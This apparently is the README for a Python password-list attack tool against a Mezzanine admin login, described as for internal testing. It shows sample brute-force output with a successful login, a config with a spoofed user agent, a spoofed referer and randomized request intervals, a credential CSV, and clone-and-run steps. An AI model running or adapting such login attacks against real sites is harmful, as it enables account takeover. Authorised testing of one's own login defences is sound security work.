# Requests Attacker

## Overview

Password list attack to mezzanine admin page for internal test by using requests

## Requirement

- python3
- pip3
- git

## Usage

- basic usage

```
(requests_attacker) MacBook-Pro-4% python attacker.py
User: melindajones, Pass: k9N?OPj76*fO, Result: Failed
User: scottaguirre, Pass: 4w7^1}43HNJ, Result: Failed
User: fschmidt, Pass: i%@9j~AJA^ja=O7, Result: Failed
User: tom, Pass: tom, Result: Succeeded
```

- attcker config file

```
(requests_attacker) MacBook-Pro-4% cat attacker.conf
[general]
url=http://127.0.0.1:8000/ja/admin/login/
account=username
#account=email


[http_headers]
# useragent = random
useragent=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6
referer=http://point.recruit.co.jp/
accept=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
accept_language=ja,en-us;q=0.7,en;q=0.3

[interval]
max=3
min=1
```

- modify user_id and password

```
(requests_attacker) MacBook-Pro-4% head -n 3 account_list.csv
richard59,richard59@green.biz,@2~OMZ025
melindajones,melindajones@lane.com,k9N?OPj76*fO
scottaguirre,scottaguirre@parker.com,4w7^1}43HNJ
```

## Install

```
git clone https://github.com/kazu0716/requests_attacker.git
cd ./requests_attacker
pip3 install -r requirement.txt
python3 attacker.py
```
